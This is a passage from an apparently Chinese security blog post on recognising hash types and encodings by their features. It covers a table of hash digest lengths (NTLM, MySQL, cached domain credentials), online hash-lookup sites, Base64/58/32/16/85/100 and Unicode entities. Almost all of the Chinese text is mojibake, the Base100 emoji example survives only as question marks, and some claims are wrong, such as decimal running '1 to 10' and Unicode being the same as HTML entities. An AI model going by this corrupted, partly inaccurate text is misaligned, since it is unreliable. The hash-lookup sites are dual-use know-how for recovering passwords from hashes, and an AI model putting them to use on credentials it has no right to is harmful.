class="number">56</span></span><br><span class="line"><span class="attribute">24</span> 	haval224,<span class="number">4</span> 	<span class="number">56</span></span><br><span class="line"><span class="attribute">25</span> 	haval224,<span class="number">5</span> 	<span class="number">56</span></span><br><span class="line"><span class="attribute">26</span> 	haval256,<span class="number">3</span> 	<span class="number">64</span></span><br><span class="line"><span class="attribute">27</span> 	haval256,<span class="number">4</span> 	<span class="number">64</span></span><br><span class="line"><span class="attribute">28</span> 	haval256,<span class="number">5</span> 	<span class="number">64</span></span><br><span class="line"><span class="attribute">29</span> 	joaat 	     <span class="number">8</span></span><br><span class="line"><span class="attribute">30</span> 	md2          <span class="number">32</span></span><br><span class="line"><span class="attribute">31</span> 	md4 	     <span class="number">32</span></span><br><span class="line"><span class="attribute">32</span> 	ripemd128 	 <span class="number">32</span></span><br><span class="line"><span class="attribute">33</span> 	ripemd160 	 <span class="number">40</span></span><br><span class="line"><span class="attribute">34</span> 	ripemd256 	 <span class="number">64</span></span><br><span class="line"><span class="attribute">35</span> 	ripemd320 	 <span class="number">80</span></span><br><span class="line"><span class="attribute">36</span> 	sha224 	     <span class="number">56</span></span><br><span class="line"><span class="attribute">37</span> 	sha3-<span class="number">224</span> 	 <span class="number">56</span></span><br><span class="line"><span class="attribute">38</span> 	sha3-<span class="number">256</span> 	 <span class="number">64</span></span><br><span class="line"><span class="attribute">39</span> 	sha3-<span class="number">384</span> 	 <span class="number">96</span></span><br><span class="line"><span class="attribute">40</span> 	sha3-<span class="number">512</span> 	 <span class="number">128</span></span><br><span class="line"><span class="attribute">41</span> 	sha384       <span class="number">96</span></span><br><span class="line"><span class="attribute">42</span> 	sha512/<span class="number">224</span>   <span class="number">56</span></span><br><span class="line"><span class="attribute">43</span> 	sha512/<span class="number">256</span> 	 <span class="number">64</span></span><br><span class="line"><span class="attribute">44</span> 	snefru       <span class="number">64</span></span><br><span class="line"><span class="attribute">45</span> 	snefru256    <span class="number">64</span></span><br><span class="line"><span class="attribute">46</span> 	tiger128,<span class="number">3</span> 	 <span class="number">32</span></span><br><span class="line"><span class="attribute">47</span> 	tiger128,<span class="number">4</span> 	 <span class="number">32</span></span><br><span class="line"><span class="attribute">48</span> 	tiger160,<span class="number">3</span>   <span class="number">40</span></span><br><span class="line"><span class="attribute">49</span> 	tiger160,<span class="number">4</span>   <span class="number">40</span></span><br><span class="line"><span class="attribute">50</span> 	tiger192,<span class="number">3</span> 	 <span class="number">48</span></span><br><span class="line"><span class="attribute">51</span> 	tiger192,<span class="number">4</span>   <span class="number">48</span></span><br><span class="line"><span class="attribute">52</span> 	whirlpool 	 <span class="number">128</span></span><br><span class="line"><span class="attribute">53</span> 	mysql 	     è€MYSQLæ•°æ®åº“ç”¨çš„ï¼Œ<span class="number">16</span>ä½ï¼Œä¸”ç¬¬<span class="number">1</span>ä½å’Œç¬¬<span class="number">7</span>ä½å¿…é¡»ä¸º<span class="number">0</span>-<span class="number">8</span></span><br><span class="line"><span class="attribute">54</span> 	mysql5 	     <span class="number">40</span></span><br><span class="line"><span class="attribute">55</span> 	NTLM 	     <span class="number">32</span></span><br><span class="line"><span class="attribute">56</span> 	Domain Cached Credentials 	<span class="number">32</span></span><br></pre></td></tr></table></figure>

<h2 id="å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š"><a href="#å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š" class="headerlink" title="å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š"></a>å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š</h2><p><code>www.cmd5.comï¼ˆå¸¦æ‰¹é‡è§£å¯†å·¥å…·ï¼‰</code></p>
<p><code>www.somd5.com</code></p>
<p><code>cmd5.la</code></p>
<p><code>pmd5.com</code></p>
<p><code>www.ttmd5.comï¼ˆå¸¦æ‰¹é‡è§£å¯†å·¥å…·ï¼‰</code></p>
<hr>
<p><u>Base64ã€Base58ã€Base32ã€Base16ã€Base85ã€Base100ç­‰ç›¸ä¼¼åŠ å¯†ç±»å‹</u></p>
<h2 id="1ã€Base64â€”â€”ç¤ºä¾‹"><a href="#1ã€Base64â€”â€”ç¤ºä¾‹" class="headerlink" title="1ã€Base64â€”â€”ç¤ºä¾‹"></a>1ã€Base64â€”â€”ç¤ºä¾‹</h2><p><u><strong>YWRtaW4tcm9vdA&#x3D;&#x3D;</strong></u></p>
<p>ä¸€èˆ¬æƒ…å†µä¸‹å¯†æ–‡å°¾éƒ¨éƒ½ä¼šæœ‰ä¸¤ä¸ªç­‰å·ï¼Œæ˜æ–‡å¾ˆå°‘çš„æ—¶å€™åˆ™æ²¡æœ‰</p>
<p>Base64ç¼–ç è¦æ±‚æŠŠ3ä¸ª8ä½å­—èŠ‚ï¼ˆ38&#x3D;24ï¼‰è½¬åŒ–ä¸º4ä¸ª6ä½çš„å­—èŠ‚ï¼ˆ46&#x3D;24ï¼‰ï¼Œä¹‹ååœ¨6ä½çš„å‰é¢è¡¥ä¸¤ä¸ª0ï¼Œå½¢æˆ8ä½ä¸€ä¸ªå­—èŠ‚çš„å½¢å¼ã€‚å¦‚æœå‰©ä¸‹çš„å­—ç¬¦ä¸è¶³3ä¸ªå­—èŠ‚ï¼Œåˆ™ç”¨0å¡«å……ï¼Œè¾“å‡ºå­—ç¬¦ä½¿ç”¨â€˜&#x3D;â€™ï¼Œå› æ­¤ç¼–ç åè¾“å‡ºçš„æ–‡æœ¬æœ«å°¾å¯èƒ½ä¼šå‡ºç°1æˆ–2ä¸ªâ€˜&#x3D;â€™ï¼Œå¦‚å›¾ã€‚</p>
<p><img src="/post/Encrypted-ciphertext-features/image-20220721180138424.png" alt="image-20220721180138424"></p>
<p>ä¸ºäº†ä¿è¯æ‰€è¾“å‡ºçš„ç¼–ç ä½å¯è¯»å­—ç¬¦ï¼ŒBase64åˆ¶å®šäº†ä¸€ä¸ªç¼–ç è¡¨ï¼Œä»¥ä¾¿è¿›è¡Œç»Ÿä¸€è½¬æ¢ã€‚ç¼–ç è¡¨çš„å¤§å°ä¸º2^6&#x3D;64ï¼Œè¿™ä¹Ÿæ˜¯Base64åç§°çš„ç”±æ¥ã€‚</p>
<p><img src="/post/Encrypted-ciphertext-features/image-20220721180249541.png" alt="image-20220721180249541"></p>
<h3 id="Base64ä½¿ç”¨æ³¨æ„é—®é¢˜"><a href="#Base64ä½¿ç”¨æ³¨æ„é—®é¢˜" class="headerlink" title="Base64ä½¿ç”¨æ³¨æ„é—®é¢˜"></a>Base64ä½¿ç”¨æ³¨æ„é—®é¢˜</h3><h4 id="ä¸€ã€Base64å’ŒURLä¼ å‚é—®é¢˜"><a href="#ä¸€ã€Base64å’ŒURLä¼ å‚é—®é¢˜" class="headerlink" title="ä¸€ã€Base64å’ŒURLä¼ å‚é—®é¢˜"></a>ä¸€ã€Base64å’ŒURLä¼ å‚é—®é¢˜</h4><p>æ ‡å‡†çš„Base64å¹¶ä¸é€‚åˆç›´æ¥æ”¾åœ¨URLé‡Œä¼ è¾“ï¼Œå› ä¸ºURLç¼–ç å™¨ä¼šæŠŠæ ‡å‡†Base64ä¸­çš„â€œ&#x2F;â€å’Œâ€œ+â€å­—ç¬¦å˜ä¸ºå½¢å¦‚â€œ%XXâ€çš„å½¢å¼ï¼Œè€Œè¿™äº›â€œ%â€å·åœ¨å­˜å…¥æ•°æ®åº“æ—¶è¿˜éœ€è¦å†è¿›è¡Œè½¬æ¢ï¼Œå› ä¸ºANSI SQLä¸­å·²å°†â€œ%â€å·ç”¨ä½œé€šé…ç¬¦ã€‚</p>
<p>ä¸ºè§£å†³æ­¤é—®é¢˜ï¼Œå¯é‡‡ç”¨ä¸€ç§ç”¨äºURLçš„æ”¹è¿›Base64ç¼–ç ï¼Œå®ƒåœ¨æœ«å°¾å¡«å……â€™&#x3D;â€™å·ï¼Œå¹¶å°†æ ‡å‡†Base64ä¸­çš„â€œ+â€å’Œâ€œ&#x2F;â€åˆ†åˆ«æ”¹æˆäº†â€œ-â€å’Œâ€œ_â€ï¼Œè¿™æ ·å°±å…å»äº†åœ¨URLç¼–è§£ç å’Œæ•°æ®åº“å­˜å‚¨æ—¶æ‰€è¦ä½œçš„è½¬æ¢ï¼Œé¿å…äº†ç¼–ç ä¿¡æ¯é•¿åº¦åœ¨æ­¤è¿‡ç¨‹ä¸­çš„å¢åŠ ï¼Œå¹¶ç»Ÿä¸€äº†æ•°æ®åº“ã€è¡¨å•ç­‰å¤„å¯¹è±¡æ ‡è¯†ç¬¦çš„æ ¼å¼ã€‚</p>
<h4 id="äºŒã€Base64å’ŒURLä¼ å‚é—®é¢˜æ”¹å–„"><a href="#äºŒã€Base64å’ŒURLä¼ å‚é—®é¢˜æ”¹å–„" class="headerlink" title="äºŒã€Base64å’ŒURLä¼ å‚é—®é¢˜æ”¹å–„"></a>äºŒã€Base64å’ŒURLä¼ å‚é—®é¢˜æ”¹å–„</h4><p>å¦æœ‰ä¸€ç§ç”¨äºæ­£åˆ™è¡¨è¾¾å¼çš„æ”¹è¿›Base64å˜ç§ï¼Œå®ƒå°†â€œ+â€å’Œâ€œ&#x2F;â€æ”¹æˆäº†â€œ!â€å’Œâ€œ-â€ï¼Œå› ä¸ºâ€œ+â€,â€œ*â€ä»¥åŠå‰é¢åœ¨IRCuä¸­ç”¨åˆ°çš„â€œ[â€å’Œâ€œ]â€åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­éƒ½å¯èƒ½å…·æœ‰ç‰¹æ®Šå«ä¹‰ã€‚</p>
<p>æ­¤å¤–è¿˜æœ‰ä¸€äº›å˜ç§ï¼Œå®ƒä»¬å°†â€œ+&#x2F;â€æ”¹ä¸ºâ€œ-â€æˆ–â€œ.â€ï¼ˆç”¨ä½œç¼–ç¨‹è¯­è¨€ä¸­çš„æ ‡è¯†ç¬¦åç§°ï¼‰æˆ–â€œ.-â€ï¼ˆç”¨äºXMLä¸­çš„Nmtokenï¼‰ç”šè‡³â€œ_:â€ï¼ˆç”¨äºXMLä¸­çš„Nameï¼‰ã€‚</p>
<h4 id="ä¸‰ã€Base64è½¬æ¢åæ¯”åŸæœ‰çš„å­—ç¬¦ä¸²é•¿1-3"><a href="#ä¸‰ã€Base64è½¬æ¢åæ¯”åŸæœ‰çš„å­—ç¬¦ä¸²é•¿1-3" class="headerlink" title="ä¸‰ã€Base64è½¬æ¢åæ¯”åŸæœ‰çš„å­—ç¬¦ä¸²é•¿1&#x2F;3"></a>ä¸‰ã€Base64è½¬æ¢åæ¯”åŸæœ‰çš„å­—ç¬¦ä¸²é•¿1&#x2F;3</h4><p>Base64è¦æ±‚æŠŠæ¯ä¸‰ä¸ª8Bitçš„å­—èŠ‚è½¬æ¢ä¸ºå››ä¸ª6Bitçš„å­—èŠ‚ï¼ˆ38 &#x3D; 46 &#x3D; 24ï¼‰ï¼Œç„¶åæŠŠ6Bitå†æ·»ä¸¤ä½é«˜ä½0ï¼Œç»„æˆå››ä¸ª8Bitçš„å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè½¬æ¢åçš„å­—ç¬¦ä¸²ç†è®ºä¸Šå°†è¦æ¯”åŸæ¥çš„é•¿1&#x2F;3ã€‚<br>å››ã€Base64è½¬æ¢æ€»ç»“</p>
<p>Base64è½¬æ¢ï¼Œæœ€å¥½æ˜¯ä¸è¦ç”¨åœ¨åŠ å¯†ä¸Šï¼Œå°¤å…¶æ˜¯å‚æ•°åŠ å¯†ï¼Œå¾ˆå®¹æ˜“å‡ºé—®é¢˜ã€‚</p>
<h2 id="2ã€Base58â€”â€”ç¤ºä¾‹"><a href="#2ã€Base58â€”â€”ç¤ºä¾‹" class="headerlink" title="2ã€Base58â€”â€”ç¤ºä¾‹"></a>2ã€Base58â€”â€”ç¤ºä¾‹</h2><p><u><strong>6tmHCZvhgfNjQu</strong></u></p>
<p>å®ƒæœ€å¤§çš„ç‰¹ç‚¹æ˜¯æ²¡æœ‰ç­‰å·</p>
<p>Base58æ˜¯ç”¨äºæ¯”ç‰¹å¸ï¼ˆBitcoinï¼‰ä¸­ä½¿ç”¨çš„ä¸€ç§ç‹¬ç‰¹çš„ç¼–ç æ–¹å¼ï¼Œä¸»è¦ç”¨äºäº§ç”ŸBitcoinçš„é’±åŒ…åœ°å€ã€‚</p>
<p>ç›¸æ¯”Base64ï¼ŒBase58ä¸ä½¿ç”¨æ•°å­—â€0â€ï¼Œå­—æ¯å¤§å†™â€Oâ€ï¼Œå­—æ¯å¤§å†™â€Iâ€ï¼Œå’Œå­—æ¯å°å†™â€lâ€ï¼Œä»¥åŠâ€+â€œå’Œâ€&#x2F;â€œç¬¦å·ã€‚</p>
<p>æ¯”ç‰¹å¸çš„Base58å­—æ¯è¡¨ï¼š</p>
<p>123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz</p>
<p>ç®€å•çš„è¯´ï¼šBase58ä¸€ç§ç¼–ç æ–¹å¼ï¼Œè·Ÿåè¿›åˆ¶ï¼Œåå…­è¿›åˆ¶ä¸€æ ·ï¼Œä¸è¿‡æ›´çŸ­æ›´çœç©ºé—´ã€‚</p>
<p>Base58çš„åŸç†æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>äºŒè¿›åˆ¶ï¼š0å’Œ1</p>
<p>åè¿›åˆ¶ï¼š1åˆ°10</p>
<p>åå…­è¿›åˆ¶ï¼šåè¿›åˆ¶çš„åŸºç¡€ä¸ŠåŠ ä¸Šäº†A-F å…­ä¸ªå­—æ¯</p>
<p>Base58å¯ä»¥ç†è§£ä¸ºä¸€ç§58è¿›åˆ¶ã€‚</p>
<p>Base58åŒ…å«äº†é˜¿æ‹‰ä¼¯æ•°å­—ã€å°å†™è‹±æ–‡å­—æ¯ï¼Œå¤§å†™è‹±æ–‡å­—æ¯ã€‚</p>
<p>ä½†æ˜¯å»æ‰äº†ä¸€äº›å®¹æ˜“æ··æ·†çš„æ•°å­—å’Œå­—æ¯ï¼š0ï¼ˆæ•°å­—0ï¼‰ã€Oï¼ˆoçš„å¤§å†™å­—æ¯ï¼‰ã€lï¼ˆ Lçš„å°å†™å­—æ¯ï¼‰ã€Iï¼ˆiçš„å¤§å†™å­—æ¯ï¼‰</p>
<p><img src="/post/Encrypted-ciphertext-features/image-20220721180316955.png" alt="image-20220721180316955"></p>
<h2 id="3ã€Base32â€”â€”ç¤ºä¾‹"><a href="#3ã€Base32â€”â€”ç¤ºä¾‹" class="headerlink" title="3ã€Base32â€”â€”ç¤ºä¾‹"></a>3ã€Base32â€”â€”ç¤ºä¾‹</h2><p><u><strong>GEZDGNBVGY3TQOJQGE&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</strong></u></p>
<p><u>ä»–çš„ç‰¹ç‚¹æ˜¯æ˜æ–‡è¶…è¿‡åä¸ªåé¢å°±ä¼šæœ‰å¾ˆå¤šç­‰å·</u></p>
<p>Base32ä½¿ç”¨äº†ASCIIç¼–ç ä¸­å¯æ‰“å°çš„<u>32ä¸ªå­—ç¬¦</u>(<strong>å¤§å†™</strong>å­—æ¯A-Zå’Œæ•°å­—2-7)å¯¹ä»»æ„å­—èŠ‚æ•°æ®è¿›è¡Œç¼–ç .Base32å°†ä¸²èµ·æ¥çš„äºŒè¿›åˆ¶æ•°æ®æŒ‰ç…§5ä¸ªäºŒè¿›åˆ¶ä½åˆ†ä¸ºä¸€ç»„ï¼Œç”±äºä¼ è¾“æ•°æ®çš„å•ä½æ˜¯å­—èŠ‚(å³8ä¸ªäºŒè¿›åˆ¶ä½).æ‰€ä»¥åˆ†å‰²ä¹‹å‰çš„äºŒè¿›åˆ¶ä½æ•°æ˜¯40çš„å€æ•°(40æ˜¯5å’Œ8çš„æœ€å°å…¬å€æ•°).å¦‚æœä¸è¶³40ä½ï¼Œåˆ™åœ¨ç¼–ç åæ•°æ®è¡¥å……â€&#x3D;â€ï¼Œä¸€ä¸ªâ€&#x3D;â€ç›¸å½“äºä¸€ä¸ªç»„(5ä¸ªäºŒè¿›åˆ¶ä½)ï¼Œç¼–ç åçš„æ•°æ®æ˜¯åŸå…ˆçš„8&#x2F;5å€.</p>
<p><img src="/post/Encrypted-ciphertext-features/image-20220721180354078.png" alt="image-20220721180354078"></p>
<p>Base32å°†ä»»æ„å­—ç¬¦ä¸²æŒ‰ç…§å­—èŠ‚è¿›è¡Œåˆ‡åˆ†ï¼Œå¹¶å°†æ¯ä¸ªå­—èŠ‚å¯¹åº”çš„äºŒè¿›åˆ¶å€¼ï¼ˆä¸è¶³8æ¯”ç‰¹é«˜ä½è¡¥0ï¼‰ä¸²è”èµ·æ¥ï¼ŒæŒ‰ç…§5æ¯”ç‰¹ä¸€ç»„è¿›è¡Œåˆ‡åˆ†ï¼Œå¹¶å°†æ¯ç»„äºŒè¿›åˆ¶å€¼è½¬æ¢æˆåè¿›åˆ¶æ¥å¯¹åº”32ä¸ªå¯æ‰“å°å­—ç¬¦ä¸­çš„ä¸€ä¸ªã€‚</p>
<p><img src="/post/Encrypted-ciphertext-features/image-20220721180407579.png" alt="image-20220721180407579"></p>
<p>ç”±äºæ•°æ®çš„äºŒè¿›åˆ¶ä¼ è¾“æ˜¯æŒ‰ç…§8æ¯”ç‰¹ä¸€ç»„è¿›è¡Œï¼ˆå³ä¸€ä¸ªå­—èŠ‚ï¼‰ï¼Œå› æ­¤Base32æŒ‰5æ¯”ç‰¹åˆ‡åˆ†çš„äºŒè¿›åˆ¶æ•°æ®å¿…é¡»æ˜¯40æ¯”ç‰¹çš„å€æ•°ï¼ˆ5å’Œ8çš„æœ€å°å…¬å€æ•°ï¼‰ã€‚ä¾‹å¦‚è¾“å…¥å•å­—èŠ‚å­—ç¬¦â€œ%â€ï¼Œå®ƒå¯¹åº”çš„äºŒè¿›åˆ¶å€¼æ˜¯â€œ100101â€ï¼Œå‰é¢è¡¥ä¸¤ä¸ª0å˜æˆâ€œ00100101â€ï¼ˆäºŒè¿›åˆ¶å€¼ä¸è¶³8æ¯”ç‰¹çš„éƒ½è¦åœ¨é«˜ä½åŠ 0ç›´åˆ°8æ¯”ç‰¹ï¼‰ï¼Œä»å·¦ä¾§å¼€å§‹æŒ‰ç…§5æ¯”ç‰¹åˆ‡åˆ†æˆä¸¤ç»„ï¼šâ€œ00100â€å’Œâ€œ101â€ï¼Œåä¸€ç»„ä¸è¶³5æ¯”ç‰¹ï¼Œåˆ™åœ¨æœ«å°¾å¡«å……0ç›´åˆ°5æ¯”ç‰¹ï¼Œå˜æˆâ€œ00100â€å’Œâ€œ10100â€ï¼Œè¿™ä¸¤ç»„äºŒè¿›åˆ¶æ•°åˆ†åˆ«è½¬æ¢æˆåè¿›åˆ¶æ•°ï¼Œé€šè¿‡ä¸Šè¿°è¡¨æ ¼å³å¯æ‰¾åˆ°å…¶å¯¹åº”çš„å¯æ‰“å°å­—ç¬¦â€œEâ€å’Œâ€œUâ€ï¼Œä½†æ˜¯è¿™é‡Œåªç”¨åˆ°ä¸¤ç»„å…±10æ¯”ç‰¹ï¼Œè¿˜å·®30æ¯”ç‰¹è¾¾åˆ°40æ¯”ç‰¹ï¼ŒæŒ‰ç…§5æ¯”ç‰¹ä¸€ç»„è¿˜éœ€6ç»„ï¼Œåˆ™åœ¨æœ«å°¾å¡«å……6ä¸ªâ€œ&#x3D;â€ã€‚å¡«å……â€œ&#x3D;â€ç¬¦å·çš„ä½œç”¨æ˜¯æ–¹ä¾¿ä¸€äº›ç¨‹åºçš„æ ‡å‡†åŒ–è¿è¡Œï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹ä¸æ·»åŠ ä¹Ÿæ— å…³ç´§è¦ï¼Œè€Œä¸”ï¼Œåœ¨URLä¸­ä½¿ç”¨æ—¶å¿…é¡»å»æ‰â€œ&#x3D;â€ç¬¦å·ã€‚</p>
<p><u>ä¸Base64ç›¸æ¯”ï¼ŒBase32å…·æœ‰è®¸å¤šä¼˜ç‚¹ï¼š</u></p>
<p>1.é€‚åˆä¸åŒºåˆ†å¤§å°å†™çš„æ–‡ä»¶ç³»ç»Ÿï¼Œæ›´åˆ©äºäººç±»å£è¯­äº¤æµæˆ–è®°å¿†ã€‚</p>
<p>2.ç»“æœå¯ä»¥ç”¨ä½œæ–‡ä»¶åï¼Œå› ä¸ºå®ƒä¸åŒ…å«è·¯å¾„åˆ†éš”ç¬¦ â€œ&#x2F;â€ç­‰ç¬¦å·ã€‚</p>
<p>3.æ’é™¤äº†è§†è§‰ä¸Šå®¹æ˜“æ··æ·†çš„å­—ç¬¦ï¼Œå› æ­¤å¯ä»¥å‡†ç¡®çš„äººå·¥å½•å…¥ã€‚ï¼ˆä¾‹å¦‚ï¼ŒRFC4648ç¬¦å·é›†å¿½ç•¥äº†æ•°å­—â€œ1â€ã€â€œ8â€å’Œâ€œ0â€ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½ä¸å­—æ¯â€œIâ€ï¼Œâ€œBâ€å’Œâ€œOâ€æ··æ·†ï¼‰ã€‚</p>
<p>4.æ’é™¤å¡«å……ç¬¦å·â€œ&#x3D;â€çš„ç»“æœå¯ä»¥åŒ…å«åœ¨URLä¸­ï¼Œè€Œä¸ç¼–ç ä»»ä½•å­—ç¬¦ã€‚</p>
<p><u>Base32ä¹Ÿæ¯”Base16æœ‰ä¼˜åŠ¿ï¼š</u></p>
<p><strong>Â·</strong>Base32æ¯”Base16å ç”¨çš„ç©ºé—´æ›´å°ã€‚ï¼ˆ1000æ¯”ç‰¹æ•°æ®Base32éœ€è¦200ä¸ªå­—ç¬¦ï¼Œè€ŒBase16åˆ™ä¸º250ä¸ªå­—ç¬¦ï¼‰</p>
<p><u>Base32çš„ç¼ºç‚¹ï¼š</u></p>
<p><strong>Â·</strong>Base32æ¯”Base64å¤šå ç”¨å¤§çº¦20ï¼…çš„ç©ºé—´ã€‚å› ä¸ºBase32ä½¿ç”¨8ä¸ªASCIIå­—ç¬¦å»ç¼–ç åŸæ•°æ®ä¸­çš„5ä¸ªå­—èŠ‚æ•°æ®ï¼Œè€ŒBase64æ˜¯ä½¿ç”¨4ä¸ªASCIIå­—ç¬¦å»ç¼–ç åŸæ•°æ®ä¸­çš„3ä¸ªå­—èŠ‚æ•°æ®ã€‚</p>
<h2 id="4ã€Base16â€”â€”ç¤ºä¾‹"><a href="#4ã€Base16â€”â€”ç¤ºä¾‹" class="headerlink" title="4ã€Base16â€”â€”ç¤ºä¾‹"></a>4ã€Base16â€”â€”ç¤ºä¾‹</h2><p><u><strong>61646D696E</strong></u></p>
<p>å®ƒçš„ç‰¹ç‚¹æ˜¯<u>æ²¡æœ‰ç­‰å·</u>å¹¶ä¸”<u>æ•°å­—è¦å¤šäºå­—æ¯</u></p>
<p>Base16ç¼–ç çš„æ–¹å¼ï¼š</p>
<p>1.å°†æ•°æ®(æ ¹æ®ASCIIç¼–ç ï¼ŒUTF-8ç¼–ç ç­‰)è½¬æˆå¯¹åº”çš„äºŒè¿›åˆ¶æ•°ï¼Œä¸è¶³8æ¯”ç‰¹ä½é«˜ä½è¡¥0ã€‚ç„¶åå°†æ‰€æœ‰çš„äºŒè¿›åˆ¶å…¨éƒ¨ä¸²èµ·æ¥ï¼Œ4ä¸ªäºŒè¿›åˆ¶ä½ä¸ºä¸€ç»„ï¼Œè½¬åŒ–æˆå¯¹åº”åè¿›åˆ¶æ•°ã€‚</p>
<p>2.æ ¹æ®åè¿›åˆ¶æ•°å€¼æ‰¾åˆ°Base16ç¼–ç è¡¨é‡Œé¢å¯¹åº”çš„å­—ç¬¦ã€‚Base16æ˜¯4ä¸ªæ¯”ç‰¹ä½è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥åŸå§‹æ˜¯1ä¸ªå­—èŠ‚(8ä¸ªæ¯”ç‰¹ä½)åˆšå¥½å¯ä»¥åˆ†æˆä¸¤ç»„,ä¹Ÿå°±æ˜¯è¯´åŸå…ˆå¦‚æœä½¿ç”¨ASCIIç¼–ç åçš„ä¸€ä¸ªå­—ç¬¦ï¼Œç°åœ¨è½¬åŒ–æˆä¸¤ä¸ªå­—ç¬¦ã€‚æ•°æ®é‡æ˜¯åŸå…ˆçš„2å€ã€‚</p>
<p><img src="/post/Encrypted-ciphertext-features/image-20220721193743306.png" alt="image-20220721193743306"></p>
<p>Base16ç¼–ç æ˜¯ä¸€ä¸ªæ ‡å‡†çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼ˆæ³¨æ„æ˜¯å­—ç¬¦ä¸²è€Œä¸æ˜¯æ•°å€¼ï¼‰ï¼Œæ›´æ˜“è¢«äººç±»å’Œè®¡ç®—æœºä½¿ç”¨ï¼Œå› ä¸ºå®ƒå¹¶ä¸åŒ…å«ä»»ä½•æ§åˆ¶å­—ç¬¦ï¼Œä»¥åŠBase64å’ŒBase32ä¸­çš„â€œ&#x3D;â€ç¬¦å·ã€‚</p>
<p><img src="/post/Encrypted-ciphertext-features/image-20220721193802684.png" alt="image-20220721193802684"></p>
<h2 id="5ã€Base85â€”â€”ç¤ºä¾‹"><a href="#5ã€Base85â€”â€”ç¤ºä¾‹" class="headerlink" title="5ã€Base85â€”â€”ç¤ºä¾‹"></a>5ã€Base85â€”â€”ç¤ºä¾‹</h2><p><u><strong>@:X4hDWe0rkE(G[OdP4CT]N#</strong></u></p>
<p>ç‰¹ç‚¹æ˜¯<u>å¥‡æ€ªçš„å­—ç¬¦æ¯”è¾ƒå¤š</u>ï¼Œä½†æ˜¯å¾ˆéš¾å‡ºç°ç­‰å·</p>
<p><img src="/post/Encrypted-ciphertext-features/image-20220721193845924.png" alt="image-20220721193845924"></p>
<h2 id="6ã€Base100â€”â€”ç¤ºä¾‹"><a href="#6ã€Base100â€”â€”ç¤ºä¾‹" class="headerlink" title="6ã€Base100â€”â€”ç¤ºä¾‹"></a>6ã€Base100â€”â€”ç¤ºä¾‹</h2><p><u><strong>????????????????????</strong></u></p>
<p>ç‰¹ç‚¹å°±æ˜¯ä¸€å †Emojiè¡¨æƒ…</p>
<p>Base100ç¼–ç &#x2F;è§£ç å·¥å…·ï¼ˆåˆåï¼šEmojiè¡¨æƒ…ç¬¦å·ç¼–ç &#x2F;è§£ç ï¼‰ï¼Œå¯å°†æ–‡æœ¬å†…å®¹ç¼–ç ä¸ºEmojiè¡¨æƒ…ç¬¦å·ï¼›åŒæ—¶ä¹Ÿå¯ä»¥å°†ç¼–ç åçš„Emojiè¡¨æƒ…ç¬¦å·å†…å®¹è§£ç ä¸ºæ–‡æœ¬ã€‚</p>
<p><img src="/post/Encrypted-ciphertext-features/image-20220721193925524.png" alt="image-20220721193925524"></p>
<h2 id="å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š-1"><a href="#å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š-1" class="headerlink" title="å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š"></a>å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š</h2><p>Base64ï¼š</p>
<p><code>tool.oschina.net</code></p>
<p><code>www.sojson.com</code></p>
<p><code>base64.us</code></p>
<p>Base58ï¼š</p>
<p><code>www.metools.info</code></p>
<p>Base32ã€16ï¼š</p>
<p><code>www.qqxiuzi.cn</code></p>
<p>Base100ï¼š</p>
<p><code>www.atoolbox.net</code></p>
<hr>
<h2 id="1ã€Unicodeâ€”â€”æ±‰å­—ç¤ºä¾‹"><a href="#1ã€Unicodeâ€”â€”æ±‰å­—ç¤ºä¾‹" class="headerlink" title="1ã€Unicodeâ€”â€”æ±‰å­—ç¤ºä¾‹"></a>1ã€Unicodeâ€”â€”æ±‰å­—ç¤ºä¾‹</h2><figure class="highlight cal"><table><tr><td class="code"><pre><span class="line">æ±‰å­—ç¤ºä¾‹&amp;<span class="string">#36825</span>ï¼ˆè¿™ï¼‰;ã€å­—æ¯ç¤ºä¾‹&amp;<span class="string">#116</span>ï¼ˆtï¼‰;ã€æ•°å­—ç¬¦å·ç¤ºä¾‹&amp;<span class="string">#53</span>ï¼ˆ<span class="number">5</span>ï¼‰;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥è¯´Unicodeä¸HTMLå®ä½“ç¼–ç æ˜¯ä¸€ä¸ªä¸œè¥¿</p>
<p>Unicodeï¼ˆç»Ÿä¸€ç ã€ä¸‡å›½ç ã€å•ä¸€ç ï¼‰æ˜¯ä¸€ç§åœ¨è®¡ç®—æœºä¸Šä½¿ç”¨çš„å­—ç¬¦ç¼–ç ã€‚Unicode æ˜¯ä¸ºäº†è§£å†³ä¼ ç»Ÿçš„å­—ç¬¦ç¼–ç æ–¹æ¡ˆçš„å±€é™è€Œäº§ç”Ÿçš„ï¼Œå®ƒä¸ºæ¯ç§è¯­è¨€ä¸­çš„æ¯ä¸ªå­—ç¬¦è®¾å®šäº†ç»Ÿä¸€å¹¶ä¸”å”¯ä¸€çš„äºŒè¿›åˆ¶ç¼–ç ï¼Œä»¥æ»¡è¶³è·¨è¯­è¨€ã€è·¨å¹³å°è¿›è¡Œæ–‡æœ¬è½¬æ¢ã€å¤„ç†çš„è¦æ±‚ã€‚1990å¹´å¼€å§‹ç ”å‘ï¼Œ1994å¹´æ­£å¼å…¬å¸ƒã€‚</p>
<p><img src="/post/Encrypted-ciphertext-features/image-20220721194526725.png" alt="image-20220721194526725"></p>
